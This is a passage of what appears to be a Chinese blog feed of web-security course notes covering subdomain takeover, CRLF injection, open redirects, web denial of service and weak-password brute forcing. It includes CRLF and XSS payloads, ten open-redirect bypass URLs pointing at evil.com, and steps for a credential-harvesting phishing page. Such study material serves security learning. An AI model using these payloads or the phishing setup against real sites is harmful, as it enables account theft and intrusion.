src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310164937041.png" alt="image-20230310164937041"></p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310164641150.png" alt="image-20230310164641150"></p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310164429722.png" alt="image-20230310164429722"></p><h4 id="子域名接管-瓜迪个人子域名劫持接管"><a href="#子域名接管-瓜迪个人子域名劫持接管" class="headerlink" title="#子域名接管-瓜迪个人子域名劫持接管"></a>#子域名接管-瓜迪个人子域名劫持接管</h4><p>含义：<img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310165444813.png" alt="image-20230310165444813"></p><p>CNAME:</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310165549997.png" alt="image-20230310165549997"></p><p>复现步骤：</p><p>1、通过检测cname获取指向</p><p>发现test.xiaodi8.com是指向<a href="http://www.testxiaodi.fun的/">www.testxiaodi.fun的</a></p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310172443923.png" alt="image-20230310172443923"></p><p>2、发现testxiaodi.fun过期受控</p><p>3、注册testxiaodi.fun实现控制</p><p>假设注册了testxiaodi.fun，将其解析到你的网站ip，随后如果访问test.xiaodi8.com显示的页面跟我们自己的testxiaodi.fun一样，说明控制了test.xiaodi8.com，将其显示改为了跟testxiaodi.fun一样</p><h4 id="检测项目-CORS-amp-JSONP-amp-子域名接管"><a href="#检测项目-CORS-amp-JSONP-amp-子域名接管" class="headerlink" title="#检测项目-CORS&amp;JSONP&amp;子域名接管"></a>#检测项目-CORS&amp;JSONP&amp;子域名接管</h4><p>1、python cors_scan.py -i top_100_domains.txt -t 100(检测CORS)</p><p>2、人工排查+burpsuite 安装Jsonp_Hunter.py抓包使用(检测JSONP)</p><p>3、dnsub爬取子域名筛选接管(检测c)</p><p>如果这两个域名过期或者出现问题</p><p><img src="/../images/Day54-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81/image-20230310171202916.png" alt="image-20230310171202916"></p><p>注册它并访问，就可以控制其主域</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、子域名接管-检测&amp;amp;探针&amp;amp;利用&lt;/p&gt;
&lt;p&gt;2、COSP跨域资源-检测&amp;amp;探针&amp;amp;利用&lt;</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day53 WEB攻防-通用漏洞&amp;CRLF注入&amp;URL重定向&amp;资源处理拒绝服务</title>
    <link href="http://example.com/2023/03/10/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/"/>
    <id>http://example.com/2023/03/10/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/</id>
    <published>2023-03-10T06:06:26.000Z</published>
    <updated>2023-03-10T07:46:17.176Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、CRLF注入-原理&amp;检测&amp;利用</p><p>2、URL重定向-原理&amp;检测&amp;利用</p><p>3、Web拒绝服务-原理&amp;检测&amp;利用</p><h3 id="下节预告："><a href="#下节预告：" class="headerlink" title="#下节预告："></a>#下节预告：</h3><p>1、JSONP&amp;CORS跨域</p><p>2、域名安全-接管劫持</p><h3 id="详细点"><a href="#详细点" class="headerlink" title="#详细点"></a>#详细点</h3><h4 id="1-CRLF注入漏洞"><a href="#1-CRLF注入漏洞" class="headerlink" title="1.CRLF注入漏洞"></a>1.CRLF注入漏洞</h4><p>是因为Web应用没有对用户输入做严格验证，导致攻击者可以输入一些恶意字符。攻击者一旦向请求行或首部中的字段注入恶意的CRLF，就能注入一些首部字段或报文主体，并在响应中输出，所以又称为HTTP响应拆分漏洞。</p><p>如何检测安全问题：CRLFuzz</p><p>漏洞说明：改变数据包的传送数据如在后面添加如下payload，则可能在数据包里面出现host:<a href="http://www.xiaodi8.com,可能会覆盖原来的/">www.xiaodi8.com，可能会覆盖原来的</a></p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310142027153.png" alt="image-20230310142027153"></p><h4 id="2-URL重定向跳转"><a href="#2-URL重定向跳转" class="headerlink" title="2.URL重定向跳转"></a>2.URL重定向跳转</h4><p>写代码时没有考虑过任意URL跳转漏洞，或者根本不知道&#x2F;不认为这是个漏洞;</p><p>写代码时考虑不周,用取子串、取后缀等方法简单判断，代码逻辑可被绕过;</p><p>对传入参数做一些奇葩的操作(域名剪切&#x2F;拼接&#x2F;重组)和判断，适得其反，反被绕过; </p><p>原始语言自带的解析URL、判断域名的函数库出现逻辑漏洞或者意外特性,可被绕过;</p><p>原始语言、服务器&#x2F;容器特性、浏览器等对标准URL协议解析处理等差异性导致绕过;</p><h4 id="3-Web拒绝服务"><a href="#3-Web拒绝服务" class="headerlink" title="3.Web拒绝服务"></a>3.Web拒绝服务</h4><p>现在有许多资源是由服务器生成然后返回给客户端的，而此类“资源生成”接口如若有参数可以被客户端控制（可控），并没有做任何资源生成大小限制，这样就会造成拒绝服务风险，导致服务器处理不过来或占用资源去处理。</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ CRLF注入-原理&amp;检测&amp;利用</p><p>➢ URL重定向-原理&amp;检测&amp;利用</p><p>➢ WEB拒绝服务-原理&amp;检测&amp;利用</p><h4 id="案例1-CRLF注入原理-amp-检测-amp-利用"><a href="#案例1-CRLF注入原理-amp-检测-amp-利用" class="headerlink" title="#案例1-CRLF注入原理&amp;检测&amp;利用"></a>#案例1-CRLF注入原理&amp;检测&amp;利用</h4><p>vulhub nginx</p><p>尝试在get &#x2F;后面写上aaaaa</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310142547321.png" alt="image-20230310142547321"></p><p>发现返回的Location里面也有</p><p>构造payload:%0aSet-cookie:JSPSESSID%3Ddrops,发现可以设置cookie</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310144654316.png" alt="image-20230310144654316"></p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">构造pyload:url=%0d%0a%0d%0a&lt;img src=1 onerror=alert(/xss/)&gt;/</span><br></pre></td></tr></table></figure><p>发现换行将img写入了页面标签中造成了xss</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310144738596.png" alt="image-20230310144738596"></p><p>此漏洞扫描工具CRLFuzz：<a href="https://github.com/dwisiswant0/crlfuzz/releases">https://github.com/dwisiswant0/crlfuzz/releases</a></p><p>如果出现此标记，则存在漏洞</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310145217725.png" alt="image-20230310145217725"></p><h4 id="案例2-URL重定向-amp-原理-amp-检测-amp-利用"><a href="#案例2-URL重定向-amp-原理-amp-检测-amp-利用" class="headerlink" title="#案例2-URL重定向&amp;原理&amp;检测&amp;利用"></a>#案例2-URL重定向&amp;原理&amp;检测&amp;利用</h4><p>举例url:<a href="http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php">http://xxx/zb_system/login.php?url=http://www.xiaodi8.com/zb_system/login.php</a></p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310145828542.png" alt="image-20230310145828542"></p><p>修改成<a href="http://www.baidu.com看是否跳转/">www.baidu.com看是否跳转</a></p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310151249497.png" alt="image-20230310151249497"></p><p>跳转成功</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310151316003.png" alt="image-20230310151316003"></p><p>大概意思是讲重定向漏洞的危害：网站接受用户输入的链接，跳转到一个攻击者控制的网站，可能导致跳转过去的用户被精心设置的钓鱼页面骗走自己的个人信息和登录口令。国外大厂的一个任意URL跳转都500$、1000$了，国内看运气~ </p><p>业务：</p><p>用户登录、统一身份认证处，认证完后会跳转</p><p>用户分享、收藏内容过后，会跳转</p><p>跨站点认证、授权后，会跳转</p><p>站内点击其它网址链接时，会跳转</p><p>设置钓鱼的原理：</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310150120061.png" alt="image-20230310150120061"></p><p>将要钓鱼伪装的页面的html源码右键另存为下载下来</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310150541219.png" alt="image-20230310150541219"></p><p>搭建在自己的服务器上，并且可以在Index.html里面写上窃取信息的代码，如xss窃取等</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310150729169.png" alt="image-20230310150729169"></p><p>在index中看接受用户名和密码的参数，这里改为1.php文件，写入php代码接受用户名和密码</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310151941212.png" alt="image-20230310151941212"></p><p>(或者将所有地方的账号密码参数改成自己想要设置的，假设是user,pass)</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310152617160.png" alt="image-20230310152617160"></p><p>并更改登录的账号密码存储的地址，每个地方的action都改一下</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310151917112.png" alt="image-20230310151917112"></p><p>这里的x.php负责接受账号密码并且保存为文本</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310152901697.png" alt="image-20230310152901697"></p><p>对应次处</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310152956532.png" alt="image-20230310152956532"></p><p>登录后接受成功</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153031897.png" alt="image-20230310153031897"></p><h5 id="黑盒看参数名："><a href="#黑盒看参数名：" class="headerlink" title="黑盒看参数名："></a>黑盒看参数名：</h5><p>redirect</p><p>redirect_to</p><p>redirect_url</p><p>url</p><p>jump</p><p>jump_to</p><p>target</p><p>to</p><p>link</p><p>linkto</p><p>domain</p><h5 id="白盒看代码块："><a href="#白盒看代码块：" class="headerlink" title="白盒看代码块："></a>白盒看代码块：</h5><p>Java：response.sendRedirect(request.getParameter(“url”))</p><p>PHP:</p><p>$redirect_url &#x3D; $_GET[‘url’];</p><p>header(“Location: “ . $redirect_url)</p><p>.NET:</p><p>string redirect_url &#x3D; request.QueryString[“url”];</p><p>Response.Redirect(redirect_url);</p><p>Django:</p><p>redirect_url &#x3D; request.GET.get(“url”)</p><p>HttpResponseRedirect(redirect_url)</p><p>Flask:</p><p>redirect_url &#x3D; request.form[‘url’]</p><p>redirect(redirect_url)</p><p>Rails:</p><p>redirect_to params[:url]</p><p>1.单斜线”&#x2F;“绕过 <a href="https://www.landgrey.me/redirect.php?url=/www.evil.com">https://www.landgrey.me/redirect.php?url=/www.evil.com</a> </p><p>2.缺少协议绕过 <a href="https://www.landgrey.me/redirect.php?url=//www.evil.com">https://www.landgrey.me/redirect.php?url=//www.evil.com</a> </p><p>3.多斜线”&#x2F;“前缀绕过 <a href="https://www.landgrey.me/redirect.php?url=///www.evil.com">https://www.landgrey.me/redirect.php?url=///www.evil.com</a> <a href="https://www.landgrey.me/redirect.php?url=www.evil.com">https://www.landgrey.me/redirect.php?url=www.evil.com</a> </p><p>4.利用”@”符号绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com">https://www.landgrey.me/redirect.php?url=https://www.landgrey.me@www.evil.com</a>  </p><p>5.利用反斜线”&quot;绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com%5Cwww.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com\www.landgrey.me</a> 6. 利用”#”符号绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com#www.landgrey.me</a> 7. 利用”?”号绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com?www.landgrey.me</a> </p><p>8.利用”\“绕过 <a href="https://www.landgrey.me/redirect.php?url=https://www.evil.com%5C%5Cwww.landgrey.me">https://www.landgrey.me/redirect.php?url=https://www.evil.com\\www.landgrey.me</a> </p><p>9.利用”.”绕过 <a href="https://www.landgrey.me/redirect.php?url=.evil">https://www.landgrey.me/redirect.php?url=.evil</a>      (可能会跳转到<a href="http://www.landgrey.me.evil域名/">www.landgrey.me.evil域名</a>) <a href="https://www.landgrey.me/redirect.php?url=.evil.com">https://www.landgrey.me/redirect.php?url=.evil.com</a>    (可能会跳转到evil.com域名) </p><p>10.重复特殊字符绕过 <a href="https://www.landgrey.me/redirect.php?url=///www.evil.com//">https://www.landgrey.me/redirect.php?url=///www.evil.com//</a>.. <a href="https://www.landgrey.me/redirect.php?url=www.evil.com//">https://www.landgrey.me/redirect.php?url=www.evil.com//</a>..</p><h4 id="案例3-WEB拒绝服务-原理-amp-检测-amp-利用"><a href="#案例3-WEB拒绝服务-原理-amp-检测-amp-利用" class="headerlink" title="#案例3-WEB拒绝服务-原理&amp;检测&amp;利用"></a>#案例3-WEB拒绝服务-原理&amp;检测&amp;利用</h4><p>1、验证码或图片显示自定义大小</p><p>2、上传压缩包解压循环资源占用</p><p>危害：会造成cpu爆满</p><p>1、当图片是w和h都是100，不占用cpu</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153415903.png" alt="image-20230310153415903"></p><p>非常大时，cpu占用变大，可能会导致站点崩溃</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153530465.png" alt="image-20230310153530465"></p><p>2、</p><p>假设网站有自动解压的功能，例如以下时解压的代码</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153739992.png" alt="image-20230310153739992"></p><p>上传一个压缩包里面有压缩包…的压缩包，访问，cpu直接拉满</p><p><img src="/../images/Day53-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1/image-20230310153859920.png" alt="image-20230310153859920"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;知识点：&quot;&gt;&lt;a href=&quot;#知识点：&quot; class=&quot;headerlink&quot; title=&quot;#知识点：&quot;&gt;&lt;/a&gt;#知识点：&lt;/h3&gt;&lt;p&gt;1、CRLF注入-原理&amp;amp;检测&amp;amp;利用&lt;/p&gt;
&lt;p&gt;2、URL重定向-原理&amp;amp;检测&amp;amp;利用&lt;/</summary>
      
    
    
    
    <category term="Web攻防" scheme="http://example.com/categories/Web%E6%94%BB%E9%98%B2/"/>
    
    
  </entry>
  
  <entry>
    <title>Day52 WEB攻防-通用漏洞&amp;弱口令安全&amp;社工字典生成&amp;服务协议&amp;Web应用</title>
    <link href="http://example.com/2023/03/09/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/"/>
    <id>http://example.com/2023/03/09/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/</id>
    <published>2023-03-09T06:52:50.000Z</published>
    <updated>2023-03-09T09:24:31.902Z</updated>
    
    <content type="html"><![CDATA[<h3 id="知识点："><a href="#知识点：" class="headerlink" title="#知识点："></a>#知识点：</h3><p>1、弱口令安全&amp;配置&amp;初始化等</p><p>2、弱口令对象&amp;Web&amp;服务&amp;应用等</p><p>3、弱口令字典&amp;查询&amp;列表&amp;列表等</p><h3 id="前置知识："><a href="#前置知识：" class="headerlink" title="#前置知识："></a>#前置知识：</h3><p>弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令，通常与管理的安全意识和平台的初始化配置等相关，通过系统弱口令，可被黑客直接获得系统控制权限。</p><p>在常见的安全测试中，弱口令会产生安全的各个领域，包括Web应用，安全设备，平台组件，操作系统等；如何获取弱口令，利用弱口令成为了此类安全问题的关键！</p><h3 id="演示案例："><a href="#演示案例：" class="headerlink" title="演示案例："></a>演示案例：</h3><p>➢ Web类-加密&amp;验证码后台猜解</p><p>➢ 服务类-SSH&amp;RDP远程终端猜解</p><p>➢ 应用类-ZIP&amp;Word文件压缩包猜解</p><p>➢ 字典类-密文收集&amp;弱口令&amp;自定义生成</p><h4 id="Web类-加密-amp-验证码后台猜解"><a href="#Web类-加密-amp-验证码后台猜解" class="headerlink" title="#Web类-加密&amp;验证码后台猜解"></a>#Web类-加密&amp;验证码后台猜解</h4><p><a href="https://github.com/smxiazi/NEW_xp_CAPTCHA">https://github.com/smxiazi/NEW_xp_CAPTCHA</a></p><h5 id="1、Zblog-密文MD5传输加密猜解"><a href="#1、Zblog-密文MD5传输加密猜解" class="headerlink" title="1、Zblog-密文MD5传输加密猜解"></a>1、Zblog-密文MD5传输加密猜解</h5><p>登录密码为md5加密</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309153303271.png" alt="image-20230309153303271"></p><p>发送到intruder模块，先添加字典，再选择要对字典加密的方式</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309153515688.png" alt="image-20230309153515688"></p><p>此处option还可以进行线程的设置</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309153629159.png" alt="image-20230309153629159"></p><p>这个模式可以设置两个变量同时爆破</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309153942778.png" alt="image-20230309153942778"></p><h5 id="2、Seacms-登录验证码识别猜解"><a href="#2、Seacms-登录验证码识别猜解" class="headerlink" title="2、Seacms-登录验证码识别猜解"></a>2、Seacms-登录验证码识别猜解</h5><p>登录的时候抓包</p><p><img src="/../images/Day52-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8/image-20230309154205665.png" alt="image-20230309154205665"></p><p>发送到intruder模式下设置密码和验证码为变量，选择Pitchfork模式（admin是正确登录账号）</p><p><img 